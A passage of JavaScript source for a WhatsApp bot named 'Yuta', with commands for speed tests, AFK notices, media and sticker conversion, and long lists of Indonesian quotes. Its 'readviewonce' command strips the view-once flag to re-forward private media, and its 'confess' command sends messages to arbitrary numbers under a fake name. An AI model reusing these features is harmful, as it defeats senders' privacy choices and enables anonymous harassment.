      showAdAttribution: true,
      title: botname,
      mediaType: 1,
      body: ownername,
      //previewType: "PHOTO",
      thumbnail: fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg'),
      renderLargerThumbnail: true,
      sourceUrl: linkch
   },
    forwardedNewsletterMessageInfo: {
     newsletterJid: saluran,
     serverMessageId: -1,
     newsletterName: `ᴘ ɪ ɴ ɢ - s ᴄ - ${botname}: ${ping}`,
    }
  }
};
await Yuta.sendMessage(m.chat, leo, { quoted: fnews });
}
break
case 'speedtest': case 'speed': {
replygcyuta('Testing Speed...')
let cp = require('child_process')
let { promisify } = require('util')
let exec = promisify(cp.exec).bind(cp)
let o
try {
	o = await exec('python3 speed.py')
	} catch (e) {
	  o = e
	} finally {
	let { stdout, stderr } = o
	if (stdout.trim()) replygcyuta(stdout)
	if (stderr.trim()) replygcyuta(stderr)
   }
}
break
case 'afk': {
let user = global.db.data.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
let afkteks = `@${m.sender.split('@')[0]} Kamu Lagi Afk Alasan? ${text ? ': ' + text : ''}`
let leo = {
  text: afkteks,
  contextInfo: {
      isForwarded: true,
     forwardingScore: 99999,
    externalAdReply: {
      showAdAttribution: true,
      title: botname,
      mediaType: 1,
      body: ownername,
      //previewType: "PHOTO",
      thumbnailUrl: "https://files.catbox.moe/8plg1x.jpg",
      renderLargerThumbnail: true,
      sourceUrl: linkch
   },
    forwardedNewsletterMessageInfo: {
     newsletterJid: saluran,
     serverMessageId: -1,
     newsletterName: `Afk By : ${botname}`,
    }
  }
};
await Yuta.sendMessage(m.chat, leo, { quoted: fnews });
}
break
			case 'readviewonce': case 'readviewone': case 'rvo': {
				if (!m.quoted) return replygcyuta(`Reply view once message\nExample: ${prefix + command}`)
				if (m.quoted.msg.viewOnce) {
					m.quoted.msg.viewOnce = false
					await Yuta.sendMessage(m.chat, { forward: m.quoted }, { quoted: m })
				} else if (m.quoted.msg.message && m.quoted.msg.message.audioMessage && m.quoted.msg.message.audioMessage.viewOnce) {
					m.quoted.msg.message.audioMessage.viewOnce = false
					m.quoted.msg.message.audioMessage.contextInfo = { forwardingScore: 1, isForwarded: true, mentionedJid: [m.sender] }
					await Yuta.relayMessage(m.chat, m.quoted.msg.message, {})
				} else {
					replygcyuta(`Reply view once message\nExample: ${prefix + command}`)
				}
			}
			break
			case 'inspect': {
				if (!text) return replygcyuta('Enter Group Link!')
				let code = q.match(/chat.whatsapp.com\/([\w\d]*)/g);
				if (code === null) return replygcyuta('No invite url detected.');
				code = code[0].replace('chat.whatsapp.com/', '');
				await Yuta.groupGetInviteInfo(code).then(anu => {
					let { id, subject, owner, subjectOwner, creation, desc, descId, participants, size, descOwner } = anu
					console.log(anu);
					let par = `*Gc Name* : ${subject}\n*ID* : ${id}\n${owner ? `*Creator* : @${owner.split('@')[0]}` : '*Creator* : -'}\n*Number of Members* : ${size}\n*Gc Created Date* : ${new Date(creation * 1000).toLocaleString()}\n*DescID* : ${descId ? descId : '-'}\n${subjectOwner ? `*GC Name Changed By* : @${subjectOwner.split('@')[0]}` : '*GC Name Changed By* : -'}\n${descOwner ? `*Desc changed by* : @${descOwner.split('@')[0]}` : '*Desc changed by* : -'}\n\n*Desc* : ${desc ? desc : '-'}\n`;
					Yuta.sendTextMentions(m.chat, par, m);
				}).catch((res) => {
					if (res.data == 406) return replygcyuta('Group Not Found❗');
					if (res.data == 410) return replygcyuta('Group URL Has Been Reset❗');
				});
			}
			break
			case 'q': case 'quoted': {
				if (!m.quoted) return replygcyuta('Reply the message!')
				const anu = await m.getQuotedObj()
				if (!anu) return replygcyuta('Format Not Available!')
				if (!anu.quoted) return replygcyuta('The Message You Reply Does Not Contain a Reply')
				await Yuta.relayMessage(m.chat, { [anu.quoted.type]: anu.quoted.msg }, {})
			}
			break
			case 'confes': case 'confess': case 'menfes': case 'menfess': {
				if (m.isGroup) return XeonStickPrivate();
				if (game.menfes[m.sender]) return replygcyuta(`You're In Session ${command}!`)
				if (!text) return replygcyuta(`Example : ${prefix + command} 91xxxx|Fake name`)
				let [teks1, teks2] = text.split`|`
				if (!isNaN(teks1) && !teks1.startsWith('0') && teks1) {
					const tujuan = teks1.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
					const onWa = await Yuta.onWhatsApp(tujuan)
					if (!onWa.length > 0) return replygcyuta('This number is not registered on WhatsApp!')
					game.menfes[m.sender] = {
						tujuan: tujuan,
						nama: teks2,
						waktu: setTimeout(() => {
							if (game.menfes[m.sender]) replygcyuta(`_Time ${command} finished_`)
							delete game.menfes[m.sender];
						}, 600000)
					};
					game.menfes[tujuan] = {
						tujuan: m.sender,
						nama: 'Recipient',
						waktu: setTimeout(() => {
							if (game.menfes[tujuan]) Yuta.sendMessage(tujuan, { text: `_Time ${command} finished_` });
							delete game.menfes[tujuan];
						}, 600000)
					};
					Yuta.sendMessage(tujuan, { text: `_${command} connected_\n*Note :* if you want to end, type _*${prefix}del${command}*_` });
					replygcyuta(`_Start ${command}..._\n*Please start sending messages/media*\n*Duration ${command} only for 10 minutes*\n*Note :* if you want to end, type _*${prefix}del${command}*_`)
				} else {
					replygcyuta(`Enter the number!\nExample : ${prefix + command} 91xxxx|Fake name`)
				}
			}
			break
			case 'delconfes': case 'delconfess': case 'delmenfes': case 'delmenfess': {
				if (!game.menfes[m.sender]) return replygcyuta(`You Are Not In ${command.split('del')[1]} session!`)
				let anu = game.menfes[m.sender]
				Yuta.sendMessage(anu.tujuan, { text: `Chat Ended By ${anu.nama ? anu.nama : 'Somebody'}` })
				replygcyuta(`Successfully Ends Session ${command.split('del')[1]}!`)
				delete game.menfes[anu.tujuan];
				delete game.menfes[m.sender];
			}
			break
			case 'toaud': case 'toaudio': {
				if (!/video/.test(mime) && !/audio/.test(mime)) return replygcyuta(`Send/Reply Video/Audio that you want to make into audio with captions ${prefix + command}`)
				replygcyuta(mess.loading)
				let media = await (m.quoted ? m.quoted.download() : m.download())
				let audio = await toAudio(media, 'mp4')
				await Yuta.sendMessage(m.chat, { audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
			}
			break
			case 'tomp3': {
				if (!/video/.test(mime) && !/audio/.test(mime)) return replygcyuta(`Send/Reply Video/Audio that you want to make into audio with captions ${prefix + command}`)
				replygcyuta(mess.loading)
				let media = await (m.quoted ? m.quoted.download() : m.download())
				let audio = await toAudio(media, 'mp4')
				await Yuta.sendMessage(m.chat, { document: audio, mimetype: 'audio/mpeg', fileName: `Yuta-Okkotsu.mp3`}, { quoted : m })
			}
			break
			case 'tovn': case 'toptt': case 'tovoice': {
				if (!/video/.test(mime) && !/audio/.test(mime)) return replygcyuta(`Send/Reply Video/Audio that you want to make into audio with captions ${prefix + command}`)
				replygcyuta(mess.loading)
				let media = await (m.quoted ? m.quoted.download() : m.download())
				let audio = await toPTT(media, 'mp4')
				await Yuta.sendMessage(m.chat, { audio: audio, mimetype: 'audio/ogg; codecs=opus', ptt: true }, { quoted: m })
			}
			break
			case 'togif': {
				if (!/webp/.test(mime) && !/video/.test(mime)) return replygcyuta(`Reply Video/Sticker with caption *${prefix + command}*`)
				replygcyuta(mess.loading)
				let { webp2mp4File } = require('./lib/uploader')
				let media = await Yuta.downloadAndSaveMediaMessage(qmsg)
				let webpToMp4 = await webp2mp4File(media)
				await Yuta.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
				await fs.unlinkSync(media)
			}
			break
case 'tovideo': case 'tomp4': {
if (!/webp/.test(mime) && !/video/.test(mime)) return replygcyuta(`Reply Video/Sticker with caption *${prefix + command}*`)
try {
sendReaction("⏳")
const { webp2mp4 } = require('./lib/webp2mp4')
let media = await quoted.download()
let webpToMp4 = await webp2mp4(media)
await Yuta.sendMessage(m.chat, { video: { url: webpToMp4 }, caption: 'Convert Webp To Video' }, { quoted: m })
sendReaction("✅")
} catch (err) {
sendReaction("❌")
}}
break
			case 'toimage': case 'toimg': {
				if (!/webp/.test(mime)) return replygcyuta(`Reply Video/Sticker with caption *${prefix + command}*`)
				replygcyuta(mess.loading)
				let media = await Yuta.downloadAndSaveMediaMessage(qmsg)
				let ran = await getRandom('.png')
				exec(`ffmpeg -i ${media} ${ran}`, (err) => {
					fs.unlinkSync(media)
					if (err) return replygcyuta('Fail❗')
					let buffer = fs.readFileSync(ran)
					Yuta.sendMessage(m.chat, { image: buffer }, { quoted: m })
					fs.unlinkSync(ran)
				})
			}
			break
			case 'toptv': {
				if (!/video/.test(mime)) return replygcyuta(`Send/Reply the video you want to use as a PTV message with caption ${prefix + command}`)
				if ((m.quoted ? m.quoted.type : m.type) === 'videoMessage') {
					const anu = await (m.quoted ? m.quoted.download() : m.download())
					const msg = await generateWAMessageContent({ video: anu }, { upload: Yuta.waUploadToServer })
					await Yuta.relayMessage(m.chat, { ptvMessage: msg.videoMessage }, {})
				} else {
					replygcyuta('Reply Videos You Want to Convert to PTV Messages!')
				}
			}
			break
case 'tourl': {
const media = await Yuta.downloadAndSaveMediaMessage(quoted)

try {
let anuu = await TelegraPh (media)
replygcyuta(`📮 *L I N K :*
${anuu}
📊 *S I Z E :* ${media.length} Byte
📛 *E x p i r e d :* No Expiry Date`)
await fs.unlinkSync(media)
} catch (e) {
replygcyuta(`terjadi error ${e} ganti ke catbox`)
try {
const k = await quoted.download()
let hasil = await catbox(k)
replygcyuta(`📮 *L I N K :*
${hasil}
📊 *S I Z E :* ${media.length} Byte
📛 *E x p i r e d :* No Expiry Date`)
await fs.unlinkSync(media)
} catch (e) {
replygcyuta(`maaf terjadi error`)
}}
}
break
//=================================================================
case 'carimusik': {
if (!quoted) return replygcyuta(`mana Musiknya kak?`)
const media = await Yuta.downloadAndSaveMediaMessage(quoted)
    let k = quoted.download()
	let anuu = await catbox(k)
	const crii = await fetchJson(`https://api.lolhuman.xyz/api/musicsearch?apikey=danzxYuta&file=${anuu}`);
	replygcyuta(`Status: succes\n*Judul* : ${crii.result.title}\n*Album* : ${crii.result.album}\n`)
}
break
			case 'texttospeech-indo': case 'tts-indo': case 'ttsindo': {
				if (!text) return replygcyuta('Where is the text you want to convert to audio??')
				let { tts } = require('./lib/tts')
				let anu = await tts(text)
				Yuta.sendMessage(m.chat, { audio: anu, ptt: true, mimetype: 'audio/mpeg' }, { quoted: m })
			}
			break
			case 'say': case 'tts': case 'gtts':{
if (!text) return replygcyuta('Where is the text?')
            let texttts = text
            const xeonrl = googleTTS.getAudioUrl(texttts, {
                lang: "en",
                slow: false,
                host: "https://translate.google.com",
            })
            return Yuta.sendMessage(m.chat, {
                audio: {
                    url: xeonrl,
                },
                mimetype: 'audio/mp4',
                ptt: true,
                fileName: `${text}.mp3`
            }, {
                quoted: m,
            })
        }
        break
			case 'toqr': case 'qr': {
				if (!text) return replygcyuta(`Please include a text or link\n\nFor Example:\n*${prefix + command}* wassup`)
				replygcyuta(mess.loading)
				await Yuta.sendMessage(m.chat, { image: { url: 'https://api.qrserver.com/v1/create-qr-code/?size=1000x1000&data=' + text }, caption: 'Here you go!' }, { quoted: m })
			}
			break
			case 'ssweb': {
				if (!text) return replygcyuta(`Example: ${prefix + command} https://github.com/Yuta-Okkotsu`)
				if (!text.startsWith('http')) {
					let buf = 'https://image.thum.io/get/width/1900/crop/1000/fullpage/https://' + q;
					await Yuta.sendMessage(m.chat, { image: { url: buf }, caption: 'Done' }, { quoted: m })
				} else {
					let buf = 'https://image.thum.io/get/width/1900/crop/1000/fullpage/' + q;
					await Yuta.sendMessage(m.chat, { image: { url: buf }, caption: 'Done' }, { quoted: m })
				}
			}
			break
			case'smeta': {
if (!/webp/.test(mime)) return replygcyuta('Reply sticker!')
  var stiker = false
    try {
        let [packname, ...author] = q.split('|')
            //var author = (author  []).join('|')
                let mime = m.quoted.mimetype || ''
                        //let img = await q.download()
                            let img = await Yuta.downloadAndSaveMediaMessage(quoted, makeid(5))
                                if (!img) return replygcyuta('Reply a sticker!')
                                    var stiker = await addExifAvatar(img, `Made by`, `Cheems Bot`)
                                      } catch (e) {
                                          console.error(e)
                                              if (Buffer.isBuffer(e)) stiker = e
                                                } finally {
                                                    if (stiker) Yuta.sendMessage(m.chat, {
                                                          sticker: stiker
                                                              }, {
                                                                    quoted: m
                                                                        })
                                                                            else return replygcyuta('reply sticker')
                                                                              }
                                                                              }       
                                                                              break
case 's': case 'sticker': case 'stiker': {
if (!users.registered) return IsReg() 
  if (!quoted) return replygcyuta(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await Yuta.sendImageAsSticker(m.chat, media, fnews, { packname: global.packname, author: global.author })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcyuta(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds'l`)
let media = await quoted.download()
let encmedia = await Yuta.sendVideoAsSticker(m.chat, media, fnews, { packname: global.packname, author: global.author })
} else {
replygcyuta(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
}
}
break
case 'qc': {
    if (!q) return replygcyuta('Enter Text');
    const ppnyauser = await Yuta.profilePictureUrl(m.sender, 'image').catch(_ => 'https://telegra.ph/file/6880771a42bad09dd6087.jpg');
    const json = {
        "type": "quote",
        "format": "png",
        "backgroundColor": "#FFFFFF",
        "width": 512,
        "height": 768,
        "scale": 2,
        "messages": [
            {
                "entities": [],
                "avatar": true,
                "from": {
                    "id": 1,
                    "name": pushname,
                    "photo": {
                        "url": ppnyauser
                    }
                },
                "text": q,
                "replygcyutaMessage": {}
            }
        ]
    };

    const res = await axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
    });
    const buffer = Buffer.from(res.data.result.image, 'base64');
    const rest = { 
        status: "200", 
        creator: "AdrianTzy",
        result: buffer
    };

    Yuta.sendImageAsSticker(m.chat, rest.result, m, {
        packname: `${global.packname}`,
        author: `${global.author}`
    });
}
break;
case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!isPremium) return replyprem(mess.premium)
if (!args.join(" ")) return replygcyuta(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
Yuta.downloadAndSaveMediaMessage(quoted, "gifee")
Yuta.sendMessage(m.chat, {sticker:fs.readFileSync("gifee.webp")}, m, { packname: pcknm, author: atnm })
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await Yuta.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcyuta('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await Yuta.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
replygcyuta(`Photo/Video?`)
}
}
break
case 'smeme': case 'stickermeme': case 'stickmeme': {
if (!users.registered) return IsReg() 
replygcyuta(mess.loading)
if (!/webp/.test(mime) && /image/.test(mime)) {
if (!text) return replygcyuta(`Usage: ${prefix + command} text1|text2`)
let { catbox } = require('./lib/uploader')
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
mee = await Yuta.downloadAndSaveMediaMessage(quoted)
const k = await quoted.download()
mem = await catbox(k)
meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`
memek = await Yuta.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
}
}
break

case 'quotesanime':
case 'quotesanim': {
if (!users.registered) return IsReg() 
  let res = await (await fetch('https://katanime.vercel.app/api/getrandom?limit=1'))
  if (!res.ok) return await res.text()
  let json = await res.json()
  if(!json.result[0]) return json
  let { indo, character, anime } = json.result[0]
  replygcyuta(`${indo}\n\n📮By:  _${character}_ \nAnime:\n${anime}`)
}
break
//=========================================\\======
case 'quotesbacot': {
if (!users.registered) return IsReg() 
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const bacot = [
'Kamu suka kopi nggak? Aku sih suka. Tau kenapa alesannya? Kopi itu ibarat kamu, pahit sih tapi bikin candu jadi pingin terus.',
'Gajian itu kayak mantan ya? Bisanya cuman lewat sebentar saja.',
'Kata pak haji, cowok yang nggak mau pergi Sholat Jumat disuruh pakai rok aja.',
'Kamu tahu mantan nggak? Mantan itu ibarat gajian, biasa numpang lewat dong di kehidupan kita.',
'Aku suka kamu, kamu suka dia, tapi dia sayangnya nggak ke kamu. Wkwkw lucu ya? Cinta serumit ini.',
'Google itu hebat ya? Tapi sayang sehebat-hebatnya Google nggak bisa menemukan jodoh kita.',
'Terlalu sering memegang pensil alis dapat membuat mata menjadi buta, jika dicolok-colokkan ke mata.',
'Saya bekerja keras karena sadar kalau uang nggak punya kaki buat jalan sendiri ke kantong saya.',
'Jika kamu tak mampu meyakinkan dan memukau orang dengan kepintaranmu, bingungkan dia dengan kebodohanmu.',
'Selelah-lelahnya bekerja, lebih lelah lagi kalau nganggur.',
'Kita hidup di masa kalau salah kena marah, pas bener dibilang tumben.',
'Nggak ada bahu pacar? Tenang aja, masih ada bahu jalan buat nyandar.',
'Mencintai dirimu itu wajar, yang gak wajar mencintai bapakmu.',
'Katanya enggak bisa bohong. Iyalah, mata kan cuma bisa melihat.',
'Madu di tangan kananmu, racun di tangan kirimu, jodoh tetap di tangan tuhan.',
'Selingkuh terjadi bukan karena ada niat, selingkuh terjadi karna pacar kamu masih laku.',
'Netizen kalau senam jempol di ponsel nggak pakai pendinginan, pantes komennya bikin panas terus.',
'Jodoh memang enggak kemana, tapi saingannya ada dimana-mana.',
'Perasaan aku salah terus di matamu. Kalu gitu, besok aku pindah ke hidungmu.',
'Jomblo tidak perlu malu, jomblo bukan berarti tidak laku, tapi memang tidak ada yang mau.',
'Jika doamu belum terkabul maka bersabar, ingatlah bahwa yang berdoa bukan cuma kamu!',
'Masih berharap dan terus berharap lama-lama aku jadi juara harapan.',
'Manusia boleh berencana, tapi akhirnya saldo juga yang menentukan.',
'Statusnya rohani, kelakuannya rohalus.',
'Kegagalan bukan suatu keberhasilan.',
'Tadi mau makan bakso, cuma kok panas banget, keliatannya baksonya lagi demam.',
'Aku juga pernah kaya, waktu gajian.',
'Aku diputusin sama pacar karena kita beda keyakinan. Aku yakin kalau aku ganteng, tapi dia enggak.',
'Masa depanmu tergantung pada mimpimu, maka perbanyaklah tidur.',
'Seberat apapun pekerjaanmu, akan semakin ringan jika tidak dibawa.',
'Jangan terlalu berharap! nanti jatuhnya sakit!',
'Ingat! Anda itu jomblo',
'Gak tau mau ngetik apa',
]
    let bacotan = pickRandom(bacot)
  replygcyuta(bacotan)
}
break
//=========================================\\======
case 'quotesbucin': {
if (!users.registered) return IsReg() 
const bucin = [
    "Aku memilih untuk sendiri, bukan karena menunggu yang sempurna, tetapi butuh yang tak pernah menyerah.",
    "Seorang yang single diciptakan bersama pasangan yang belum ditemukannya.",
    "Jomblo. Mungkin itu cara Tuhan untuk mengatakan 'Istirahatlah dari cinta yang salah'.",
    "Jomblo adalah anak muda yang mendahulukan pengembangan pribadinya untuk cinta yang lebih berkelas nantinya.",
    "Aku bukan mencari seseorang yang sempurna, tapi aku mencari orang yang menjadi sempurna berkat kelebihanku.",
    "Pacar orang adalah jodoh kita yang tertunda.",
    "Jomblo pasti berlalu. Semua ada saatnya, saat semua kesendirian menjadi sebuah kebersamaan dengannya kekasih halal. Bersabarlah.",
    "Romeo rela mati untuk juliet, Jack mati karena menyelamatkan Rose. Intinya, kalau tetap mau hidup, jadilah single.",
    "Aku mencari orang bukan dari kelebihannya tapi aku mencari orang dari ketulusan hatinya.",
    "Jodoh bukan sendal jepit, yang kerap tertukar. Jadi teruslah berada dalam perjuangan yang semestinya.",
    "Kalau kamu jadi senar gitar, aku nggak mau jadi gitarisnya. Karena aku nggak mau mutusin kamu.",
    "Bila mencintaimu adalah ilusi, maka izinkan aku berimajinasi selamanya.",
    "Sayang... Tugas aku hanya mencintaimu, bukan melawan takdir.",
    "Saat aku sedang bersamamu rasanya 1 jam hanya 1 detik, tetapi jika aku jauh darimu rasanya 1 hari menjadi 1 tahun.",
    "Kolak pisang tahu sumedang, walau jarak membentang cintaku takkan pernah hilang.",
    "Aku ingin menjadi satu-satunya, bukan salah satunya.",
    "Aku tidak bisa berjanji untuk menjadi yang baik. Tapi aku berjanji akan selalu mendampingi kamu.",
    "Kalau aku jadi wakil rakyat aku pasti gagal, gimana mau mikirin rakyat kalau yang selalu ada dipikiran aku hanyalah dirimu.",
    "Lihat kebunku, penuh dengan bunga. Lihat matamu, hatiku berbunga-bunga.",
    "Berjanjilah untuk terus bersamaku sekarang, esok, dan selamanya.",
    "Rindu tidak hanya muncul karena jarak yang terpisah. Tapi juga karena keinginan yang tidak terwujud.",
    "Kamu tidak akan pernah jauh dariku, kemanapun aku pergi kamu selalu ada, karena kamu selalu di hatiku, yang jauh hanya raga kita bukan hati kita.",
    "Aku tahu dalam setiap tatapanku, kita terhalang oleh jarak dan waktu. Tapi aku yakin kalau nanti kita pasti bisa bersatu.",
    "Merindukanmu tanpa pernah bertemu sama halnya dengan menciptakan lagu yang tak pernah ternyayikan.",
    "Ada kalanya jarak selalu menjadi penghalang antara aku sama kamu, namun tetap saja di hatiku kita selalu dekat.",
    "Jika hati ini tak mampu membendung segala kerinduan, apa daya tak ada yang bisa aku lakukan selain mendoakanmu.",
    "Mungkin di saat ini aku hanya bisa menahan kerinduan ini. Sampai tiba saatnya nanti aku bisa bertemu dan melepaskan kerinduan ini bersamamu.",
    "Melalui rasa rindu yang bergejolak dalam hati, di situ terkadang aku sangat membutuhkan dekap peluk kasih sayangmu.",
    "Dalam dinginnya malam, tak kuingat lagi; Berapa sering aku memikirkanmu juga merindukanmu.",
    "Merindukanmu itu seperti hujan yang datang tiba-tiba dan bertahan lama. Dan bahkan setelah hujan reda, rinduku masih terasa.",
    "Sejak mengenalmu bawaannya aku pengen belajar terus, belajar menjadi yang terbaik buat kamu.",
    "Tahu gak perbedaan pensi sama wajah kamu? Kalau pensil tulisannya bisa dihapus, tapi kalau wajah kamu gak akan ada yang bisa hapus dari pikiran aku.",
    "Bukan Ujian Nasional besok yang harus aku khawatirkan, tapi ujian hidup yang aku lalui setelah kamu meninggalkanku.",
    "Satu hal kebahagiaan di sekolah yang terus membuatku semangat adalah bisa melihat senyumanmu setiap hari.",
    "Kamu tahu gak perbedaanya kalau ke sekolah sama ke rumah kamu? Kalo ke sekolah pasti yang di bawa itu buku dan pulpen, tapi kalo ke rumah kamu, aku cukup membawa hati dan cinta.",
    "Aku gak sedih kok kalo besok hari senin, aku sedihnya kalau gak ketemu kamu.",
    "Momen cintaku tegak lurus dengan momen cintamu. Menjadikan cinta kita sebagai titik ekuilibrium yang sempurna.",
    "Aku rela ikut lomba lari keliling dunia, asalkan engkai yang menjadi garis finishnya.",
    "PR-ku adalah merindukanmu. Lebih kuat dari Matematika, lebih luas dari Fisika, lebih kerasa dari Biologi.",
    "Cintaku kepadamu itu bagaikan metabolisme, yang gak akan berhenti sampai mati.",
    "Kalau jelangkungnya kaya kamu, dateng aku jemput, pulang aku anter deh.",
    "Makan apapun aku suka asal sama kamu, termasuk makan ati.",
    "Cinta itu kaya hukuman mati. Kalau nggak ditembak, ya digantung.",
    "Mencintaimu itu kayak narkoba: sekali coba jadi candu, gak dicoba bikin penasaran, ditinggalin bikin sakaw.",
    "Gue paling suka ngemil karena ngemil itu enak. Apalagi ngemilikin kamu sepenuhnya...",
    "Dunia ini cuma milik kita berdua. Yang lainnya cuma ngontrak.",
    "Bagi aku, semua hari itu adalah hari Selasa. Selasa di Surga bila dekat denganmu...",
    "Bagaimana kalau kita berdua jadi komplotan penjahat? Aku curi hatimu dan kamu curi hatiku.",
    "Kamu itu seperti kopi yang aku seruput pagi ini. Pahit, tapi bikin nagih.",
    "Aku sering cemburu sama lipstikmu. Dia bisa nyium kamu tiap hari, dari pagi sampai malam.",
    "Hanya mendengar namamu saja sudah bisa membuatku tersenyum seperti orang bodoh.",
    "Aku tau teman wanitamu bukan hanya satu, dan menyukaimu pun bukan hanya aku.",
    "Semenjak aku berhenti berharap pada dirimu, aku jadi tidak semangat dalam segala hal..",
    "Denganmu, jatuh cinta adalah patah hati paling sengaja.",
    "Sangat sulit merasakan kebahagiaan hidup tanpa kehadiran kamu disisiku.",
    "Melalui rasa rindu yang bergejolak dalam hati, di situ terkadang aku sangat membutuhkan dekap peluk kasih sayangmu.",
    "Sendainya kamu tahu, sampai saat ini aku masih mencintaimu.",
    "Terkadang aku iri sama layangan..talinya putus saja masih dikejar kejar dan gak rela direbut orang lain...",
    "Aku tidak tahu apa itu cinta, sampai akhirnya aku bertemu denganmu. Tapi, saat itu juga aku tahu rasanya patah hati.",
    "Mengejar itu capek, tapi lebih capek lagi menunggu\nMenunggu kamu menyadari keberadaanku...",
    "Jangan berhenti mencinta hanya karena pernah terluka. Karena tak ada pelangi tanpa hujan, tak ada cinta sejati tanpa tangisan.",
    "Aku punya sejuta alasan unutk melupakanmu, tapi tak ada yang bisa memaksaku untuk berhenti mencintaimu.",
    "Terkadang seseorang terasa sangat bodoh hanya untuk mencintai seseorang.",
    "Kamu adalah patah hati terbaik yang gak pernah aku sesali.",
    "Bukannya tak pantas ditunggu, hanya saja sering memberi harapan palsu.",
    "Sebagian diriku merasa sakit, Mengingat dirinya yang sangat dekat, tapi tak tersentuh.",
    "Hal yang terbaik dalam mencintai seseorang adalah dengan diam-diam mendo akannya.",
    "Kuharap aku bisa menghilangkan perasaan ini secepat aku kehilanganmu.",
    "Demi cinta kita menipu diri sendiri. Berusaha kuat nyatanya jatuh secara tak terhormat.",
    "Anggaplah aku rumahmu, jika kamu pergi kamu mengerti kemana arah pulang. Menetaplah bila kamu mau dan pergilah jika kamu bosan...",
    "Aku bingung, apakah aku harus kecewa atu tidak? Jika aku kecewa, emang siapa diriku baginya?\n\nKalau aku tidak kecewa, tapi aku menunggu ucapannya.",
    "Rinduku seperti ranting yang tetap berdiri.Meski tak satupun lagi dedaunan yang menemani, sampai akhirnya mengering, patah, dan mati.",
    "Kurasa kita sekarang hanya dua orang asing yang memiliki kenangan yang sama.",
    "Buatlah aku bisa membencimu walau hanya beberapa menit, agar tidak terlalu berat untuk melupakanmu.",
    "Aku mencintaimu dengan segenap hatiku, tapi kau malah membagi perasaanmu dengan orang lain.",
    "Mencintaimu mungkin menghancurkanku, tapi entah bagaimana meninggalkanmu tidak memperbaikiku.",
    "Kamu adalah yang utama dan pertama dalam hidupku. Tapi, aku adalah yang kedua bagimu.",
    "Jika kita hanya bisa dipertemukan dalam mimpi, aku ingin tidur selamanya.",
    "Melihatmu bahagia adalah kebahagiaanku, walaupun bahagiamu tanpa bersamaku.",
    "Aku terkadang iri dengan sebuah benda. Tidak memiliki rasa namun selalu dibutuhkan. Berbeda dengan aku yang memiliki rasa, namun ditinggalkan dan diabaikan...",
    "Bagaimana mungkin aku berpindah jika hanya padamu hatiku bersinggah?",
    "Kenangan tentangmu sudah seperti rumah bagiku. Sehingga setiap kali pikiranku melayang, pasti ujung-ujungnya akan selalu kembali kepadamu.",
    "Kenapa tisue bermanfaat? Karena cinta tak pernah kemarau. - Sujiwo Tejo",
    "Kalau mencintaimu adalah kesalahan, yasudah, biar aku salah terus saja.",
    "Sejak kenal kamu, aku jadi pengen belajar terus deh. Belajar jadi yang terbaik buat kamu.",
    "Ada yang bertingkah bodoh hanya untuk melihatmu tersenyum. Dan dia merasa bahagia akan hal itu.",
    "Aku bukan orang baik, tapi akan belajar jadi yang terbaik untuk kamu.",
    "Kita tidak mati, tapi lukanya yang membuat kita tidak bisa berjalan seperti dulu lagi.",
    "keberadaanmu bagaikan secangkir kopi yang aku butuhkan setiap pagi, yang dapat mendorongku untuk tetap bersemangat menjalani hari.",
    "Aku mau banget ngasih dunia ke kamu. Tapi karena itu nggak mungkin, maka aku akan kasih hal yang paling penting dalam hidupku, yaitu duniaku.",
    "Mending sing humoris tapi manis, ketimbang sok romantis tapi akhire tragis.",
    "Ben akhire ora kecewa, dewe kudu ngerti kapan waktune berharap lan kapan kudu mandeg.",
    "Aku ki wong Jowo seng ora ngerti artine 'I Love U'. Tapi aku ngertine mek 'Aku tresno awakmu'.",
    "Ora perlu ayu lan sugihmu, aku cukup mok setiani wes seneng ra karuan.",
    "Cintaku nang awakmu iku koyok kamera, fokus nang awakmu tok liyane mah ngeblur.",
    "Saben dino kegowo ngimpi tapi ora biso nduweni.",
    "Ora ketemu koe 30 dino rasane koyo sewulan.",
    "Aku tanpamu bagaikan sego kucing ilang karete. Ambyar.",
    "Pengenku, Aku iso muter wektu. Supoyo aku iso nemokne kowe lewih gasik. Ben Lewih dowo wektuku kanggo urip bareng sliramu.",
    "Aku ora pernah ngerti opo kui tresno, kajaba sak bare ketemu karo sliramu.",
    "Cinta aa ka neng moal leungit-leungit sanajan aa geus kawin deui.",
    "Kasabaran kaula aya batasna, tapi cinta kaula ka anjeun henteu aya se epna.",
    "Kanyaah akang moal luntur najan make Bayclean.",
    "Kenangan endah keur babarengan jeung anjeun ek tuluy diinget-inget nepi ka poho.",
    "Kuring moal bakal tiasa hirup sorangan, butuh bantosan jalmi sejen.",
    "Nyaahna aa ka neg teh jiga tukang bank keur nagih hutang (hayoh mumuntil).",
    "Kasabaran urang aya batasna, tapi cinta urang ka maneh moal aya beakna.",
    "Hayang rasana kuring ngarangkai kabeh kata cinta anu aya di dunya ieu, terus bade ku kuring kumpulkeun, supaya anjeun nyaho gede pisan rasa cinta kuring ka anjeun.",
